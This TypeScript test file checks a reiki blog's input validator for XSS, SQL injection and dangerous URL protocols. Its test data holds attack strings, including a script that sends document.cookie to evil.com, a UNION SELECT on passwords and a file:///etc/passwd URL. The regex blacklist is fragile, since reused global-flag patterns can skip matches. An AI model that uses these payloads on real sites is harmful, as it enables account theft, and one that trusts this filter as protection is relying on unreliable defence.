/**
 * Blog Security Validation Tests
 *
 * Comprehensive security testing for blog-related functionality:
 * - XSS prevention
 * - SQL injection protection
 * - Input sanitization
 * - URL validation
 * - Content security
 *
 * Part of: Track 4 (Quality) - T017: Security Validation
 * Created: 2025-10-07
 * Target: 95%+ security test coverage
 */

import { describe, it, expect } from "vitest";

/**
 * Security Validator for Blog Content
 *
 * Implements multi-layered validation for blog-related user inputs.
 * Follows patterns from ContactForm SecurityValidator.
 */
export class BlogSecurityValidator {
  /**
   * SQL Injection Patterns
   * Common SQL injection attack patterns to detect and block
   */
  private static readonly SQL_INJECTION_PATTERNS = [
    /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|TRUNCATE)\b)/gi,
    /(--|\/\*|\*\/|;)/g,
    /(\bOR\b\s+\d+\s*=\s*\d+)/gi,
    /(\bAND\b\s+\d+\s*=\s*\d+)/gi,
  ];

  /**
   * XSS Attack Patterns
   * Common XSS attack vectors to detect and block
   */
  private static readonly XSS_PATTERNS = [
    /<script[^>]*>[\s\S]*?<\/script>/gi,
    /<iframe[^>]*>[\s\S]*?<\/iframe>/gi,
    /javascript:/gi,
    /on\w+\s*=/gi,
    /<object[^>]*>[\s\S]*?<\/object>/gi,
    /<embed[^>]*>/gi,
    /<link[^>]*>/gi,
  ];

  /**
   * Dangerous Protocols
   * Protocols that should not be allowed in URLs or content
   */
  private static readonly DANGEROUS_PROTOCOLS = [
    "javascript:",
    "data:text/html",
    "vbscript:",
    "file:",
  ];

  /**
   * Validate search query input
   *
   * @param query - User-provided search query
   * @returns Validation result with sanitized query
   */
  static validateSearchQuery(query: string): {
    isValid: boolean;
    sanitizedQuery: string;
    issues: string[];
  } {
    const issues: string[] = [];

    // Check length
    if (query.length > 200) {
      issues.push("Search query too long (max 200 characters)");
      query = query.substring(0, 200);
    }

    // Check for SQL injection
    if (this.containsSQLInjection(query)) {
      issues.push("Invalid characters detected");
      return {
        isValid: false,
        sanitizedQuery: "",
        issues,
      };
    }

    // Check for XSS
    if (this.containsXSS(query)) {
      issues.push("Potentially malicious content detected");
      return {
        isValid: false,
        sanitizedQuery: "",
        issues,
      };
    }

    // Sanitize query
    const sanitizedQuery = this.sanitizeInput(query);

    return {
      isValid:
        issues.length === 0 ||
        issues[0] === "Search query too long (max 200 characters)",
      sanitizedQuery,
      issues,
    };
  }

  /**
   * Check if input contains SQL injection patterns
   */
  static containsSQLInjection(input: string): boolean {
    return this.SQL_INJECTION_PATTERNS.some((pattern) => pattern.test(input));
  }

  /**
   * Check if input contains XSS patterns
   */
  static containsXSS(input: string): boolean {
    return this.XSS_PATTERNS.some((pattern) => pattern.test(input));
  }

  /**
   * Check if URL contains dangerous protocols
   */
  static hasDangerousProtocol(url: string): boolean {
    const lowerUrl = url.toLowerCase();
    return this.DANGEROUS_PROTOCOLS.some((protocol) =>
      lowerUrl.startsWith(protocol)
    );
  }

  /**
   * Sanitize user input
   * Removes dangerous characters while preserving valid content
   */
  static sanitizeInput(input: string): string {
    return input
      .replace(/[<>]/g, "") // Remove angle brackets
      .replace(/javascript:/gi, "") // Remove javascript: protocol
      .replace(/on\w+\s*=/gi, "") // Remove event handlers
      .replace(/['"]/g, "") // Remove quotes
      .trim();
  }

  /**
   * Validate and sanitize blog post content
   * Used for user-generated content (comments, if added in future)
   */
  static validateBlogContent(content: string): {
    isValid: boolean;
    sanitizedContent: string;
    issues: string[];
  } {
    const issues: string[] = [];

    // Check length
    if (content.length > 10000) {
      issues.push("Content too long");
      return {
        isValid: false,
        sanitizedContent: "",
        issues,
      };
    }

    // Check for SQL injection
    if (this.containsSQLInjection(content)) {
      issues.push("Invalid SQL patterns detected");
      return {
        isValid: false,
        sanitizedContent: "",
        issues,
      };
    }

    // Check for XSS
    if (this.containsXSS(content)) {
      issues.push("Potentially malicious content detected");
      return {
        isValid: false,
        sanitizedContent: "",
        issues,
      };
    }

    return {
      isValid: true,
      sanitizedContent: content,
      issues,
    };
  }

  /**
   * Validate image URL
   * Ensures URLs use safe protocols and domains
   */
  static validateImageUrl(url: string): {
    isValid: boolean;
    sanitizedUrl: string;
    issues: string[];
  } {
    const issues: string[] = [];

    // Check for dangerous protocols
    if (this.hasDangerousProtocol(url)) {
      issues.push("Dangerous protocol detected");
      return {
        isValid: false,
        sanitizedUrl: "/img/placeholder.jpg",
        issues,
      };
    }

    // Validate URL format
    try {
      const parsedUrl = new URL(url, window.location.origin);

      // Only allow http, https, and relative URLs
      if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
        issues.push("Invalid protocol");
        return {
          isValid: false,
          sanitizedUrl: "/img/placeholder.jpg",
          issues,
        };
      }

      return {
        isValid: true,
        sanitizedUrl: url,
        issues,
      };
    } catch {
      issues.push("Invalid URL format");
      return {
        isValid: false,
        sanitizedUrl: "/img/placeholder.jpg",
        issues,
      };
    }
  }
}

describe("BlogSecurityValidator", () => {
  describe("Search Query Validation", () => {
    it("should validate safe search queries", () => {
      const result = BlogSecurityValidator.validateSearchQuery("reiki healing");

      expect(result.isValid).toBe(true);
      expect(result.sanitizedQuery).toBe("reiki healing");
      expect(result.issues).toEqual([]);
    });

    it("should block SQL injection in search", () => {
      const result =
        BlogSecurityValidator.validateSearchQuery("reiki' OR 1=1--");

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain("Invalid characters detected");
    });

    it("should block XSS in search", () => {
      const result = BlogSecurityValidator.validateSearchQuery(
        '<script>alert("xss")</script>'
      );

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain("Potentially malicious content detected");
    });

    it("should truncate overly long search queries", () => {
      const longQuery = "a".repeat(250);
      const result = BlogSecurityValidator.validateSearchQuery(longQuery);

      expect(result.sanitizedQuery.length).toBe(200);
      expect(result.issues).toContain(
        "Search query too long (max 200 characters)"
      );
    });

    it("should sanitize search query by removing dangerous characters", () => {
      const result =
        BlogSecurityValidator.validateSearchQuery("reiki<>healing");

      expect(result.sanitizedQuery).toBe("reikihealing");
      expect(result.sanitizedQuery).not.toContain("<");
      expect(result.sanitizedQuery).not.toContain(">");
    });

    it("should block event handler injection", () => {
      const result = BlogSecurityValidator.validateSearchQuery(
        "reiki onclick=alert(1)"
      );

      expect(result.isValid).toBe(false);
    });
  });

  describe("SQL Injection Detection", () => {
    it("should detect SELECT statement", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection("SELECT * FROM posts")
      ).toBe(true);
    });

    it("should detect INSERT statement", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection("INSERT INTO posts VALUES")
      ).toBe(true);
    });

    it("should detect DELETE statement", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection("DELETE FROM users")
      ).toBe(true);
    });

    it("should detect DROP statement", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection("DROP TABLE posts")
      ).toBe(true);
    });

    it("should detect UNION attack", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection(
          "' UNION SELECT password FROM users--"
        )
      ).toBe(true);
    });

    it("should detect SQL comments", () => {
      expect(BlogSecurityValidator.containsSQLInjection("admin'--")).toBe(true);
      expect(BlogSecurityValidator.containsSQLInjection("/* comment */")).toBe(
        true
      );
    });

    it("should detect OR 1=1 pattern", () => {
      expect(BlogSecurityValidator.containsSQLInjection("' OR 1=1--")).toBe(
        true
      );
    });

    it("should allow safe text without SQL patterns", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection("reiki healing meditation")
      ).toBe(false);
    });
  });

  describe("XSS Detection", () => {
    it("should detect script tags", () => {
      expect(
        BlogSecurityValidator.containsXSS("<script>alert(1)</script>")
      ).toBe(true);
    });

    it("should detect iframe tags", () => {
      expect(
        BlogSecurityValidator.containsXSS(
          '<iframe src="malicious.com"></iframe>'
        )
      ).toBe(true);
    });

    it("should detect javascript: protocol", () => {
      expect(BlogSecurityValidator.containsXSS("javascript:alert(1)")).toBe(
        true
      );
    });

    it("should detect event handlers", () => {
      expect(
        BlogSecurityValidator.containsXSS("<img src=x onerror=alert(1)>")
      ).toBe(true);
    });

    it("should detect object tags", () => {
      expect(
        BlogSecurityValidator.containsXSS(
          '<object data="malicious.swf"></object>'
        )
      ).toBe(true);
    });

    it("should detect embed tags", () => {
      expect(
        BlogSecurityValidator.containsXSS('<embed src="malicious.swf">')
      ).toBe(true);
    });

    it("should allow safe HTML-free text", () => {
      expect(
        BlogSecurityValidator.containsXSS("This is safe text about reiki")
      ).toBe(false);
    });
  });

  describe("Dangerous Protocol Detection", () => {
    it("should detect javascript: protocol", () => {
      expect(
        BlogSecurityValidator.hasDangerousProtocol("javascript:alert(1)")
      ).toBe(true);
    });

    it("should detect data:text/html protocol", () => {
      expect(
        BlogSecurityValidator.hasDangerousProtocol(
          "data:text/html,<script>alert(1)</script>"
        )
      ).toBe(true);
    });

    it("should detect vbscript: protocol", () => {
      expect(
        BlogSecurityValidator.hasDangerousProtocol("vbscript:msgbox(1)")
      ).toBe(true);
    });

    it("should detect file: protocol", () => {
      expect(
        BlogSecurityValidator.hasDangerousProtocol("file:///etc/passwd")
      ).toBe(true);
    });

    it("should allow safe http protocol", () => {
      expect(
        BlogSecurityValidator.hasDangerousProtocol("http://example.com")
      ).toBe(false);
    });

    it("should allow safe https protocol", () => {
      expect(
        BlogSecurityValidator.hasDangerousProtocol("https://example.com")
      ).toBe(false);
    });
  });

  describe("Input Sanitization", () => {
    it("should remove angle brackets", () => {
      const result = BlogSecurityValidator.sanitizeInput("reiki<>healing");
      expect(result).toBe("reikihealing");
    });

    it("should remove javascript: protocol", () => {
      const result = BlogSecurityValidator.sanitizeInput("javascript:alert(1)");
      expect(result).toBe("alert(1)");
    });

    it("should remove event handlers", () => {
      const result = BlogSecurityValidator.sanitizeInput("onclick=alert(1)");
      expect(result).toBe("");
    });

    it("should remove quotes", () => {
      const result = BlogSecurityValidator.sanitizeInput(
        "reiki \"healing\" 'energy'"
      );
      expect(result).toBe("reiki healing energy");
    });

    it("should trim whitespace", () => {
      const result = BlogSecurityValidator.sanitizeInput("  reiki healing  ");
      expect(result).toBe("reiki healing");
    });

    it("should preserve safe content", () => {
      const result = BlogSecurityValidator.sanitizeInput(
        "reiki healing meditation"
      );
      expect(result).toBe("reiki healing meditation");
    });
  });

  describe("Blog Content Validation", () => {
    it("should validate safe blog content", () => {
      const content = "Reiki is a form of energy healing...";
      const result = BlogSecurityValidator.validateBlogContent(content);

      expect(result.isValid).toBe(true);
      expect(result.sanitizedContent).toBe(content);
      expect(result.issues).toEqual([]);
    });

    it("should block SQL injection in content", () => {
      const content = "'; DROP TABLE posts;--";
      const result = BlogSecurityValidator.validateBlogContent(content);

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain("Invalid SQL patterns detected");
    });

    it("should block XSS in content", () => {
      const content =
        '<script>fetch("evil.com?cookie="+document.cookie)</script>';
      const result = BlogSecurityValidator.validateBlogContent(content);

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain("Potentially malicious content detected");
    });

    it("should reject overly long content", () => {
      const content = "a".repeat(10001);
      const result = BlogSecurityValidator.validateBlogContent(content);

      expect(result.isValid).toBe(false);
      expect(result.issues).toContain("Content too long");
    });
  });

  describe("Image URL Validation", () => {
    it("should validate safe HTTP URLs", () => {
      const result = BlogSecurityValidator.validateImageUrl(
        "http://example.com/image.jpg"
      );

      expect(result.isValid).toBe(true);
      expect(result.sanitizedUrl).toBe("http://example.com/image.jpg");
      expect(result.issues).toEqual([]);
    });

    it("should validate safe HTTPS URLs", () => {
      const result = BlogSecurityValidator.validateImageUrl(
        "https://example.com/image.jpg"
      );

      expect(result.isValid).toBe(true);
      expect(result.sanitizedUrl).toBe("https://example.com/image.jpg");
      expect(result.issues).toEqual([]);
    });

    it("should block javascript: protocol", () => {
      const result = BlogSecurityValidator.validateImageUrl(
        "javascript:alert(1)"
      );

      expect(result.isValid).toBe(false);
      expect(result.sanitizedUrl).toBe("/img/placeholder.jpg");
      expect(result.issues).toContain("Dangerous protocol detected");
    });

    it("should block data: protocol", () => {
      const result = BlogSecurityValidator.validateImageUrl(
        "data:text/html,<script>alert(1)</script>"
      );

      expect(result.isValid).toBe(false);
      expect(result.sanitizedUrl).toBe("/img/placeholder.jpg");
      expect(result.issues).toContain("Dangerous protocol detected");
    });

    it("should block vbscript: protocol", () => {
      const result =
        BlogSecurityValidator.validateImageUrl("vbscript:msgbox(1)");

      expect(result.isValid).toBe(false);
      expect(result.sanitizedUrl).toBe("/img/placeholder.jpg");
      expect(result.issues).toContain("Dangerous protocol detected");
    });

    it("should block file: protocol", () => {
      const result =
        BlogSecurityValidator.validateImageUrl("file:///etc/passwd");

      expect(result.isValid).toBe(false);
      expect(result.sanitizedUrl).toBe("/img/placeholder.jpg");
      expect(result.issues).toContain("Dangerous protocol detected");
    });

    it("should handle invalid URL format", () => {
      const result = BlogSecurityValidator.validateImageUrl("not-a-valid-url");

      expect(result.isValid).toBe(false);
      expect(result.sanitizedUrl).toBe("/img/placeholder.jpg");
      expect(result.issues).toContain("Invalid URL format");
    });

    it("should validate relative URLs", () => {
      const result = BlogSecurityValidator.validateImageUrl(
        "/img/blog/reiki-healing.jpg"
      );

      expect(result.isValid).toBe(true);
      expect(result.sanitizedUrl).toBe("/img/blog/reiki-healing.jpg");
    });
  });

  describe("Edge Cases", () => {
    it("should handle empty search query", () => {
      const result = BlogSecurityValidator.validateSearchQuery("");

      expect(result.isValid).toBe(true);
      expect(result.sanitizedQuery).toBe("");
    });

    it("should handle null-like inputs safely", () => {
      const result = BlogSecurityValidator.validateSearchQuery("null");

      expect(result.isValid).toBe(true);
      expect(result.sanitizedQuery).toBe("null");
    });

    it("should handle undefined-like inputs safely", () => {
      const result = BlogSecurityValidator.validateSearchQuery("undefined");

      expect(result.isValid).toBe(true);
      expect(result.sanitizedQuery).toBe("undefined");
    });

    it("should handle Unicode characters safely", () => {
      const result =
        BlogSecurityValidator.validateSearchQuery("reiki 瞑想 медитация");

      expect(result.isValid).toBe(true);
      expect(result.sanitizedQuery).toContain("瞑想");
    });

    it("should handle mixed-case SQL keywords", () => {
      expect(
        BlogSecurityValidator.containsSQLInjection("SeLeCt * FrOm posts")
      ).toBe(true);
    });

    it("should handle obfuscated XSS attempts", () => {
      expect(
        BlogSecurityValidator.containsXSS(
          "&#60;script&#62;alert(1)&#60;/script&#62;"
        )
      ).toBe(false); // HTML entity encoding should be handled at rendering layer
    });
  });
});
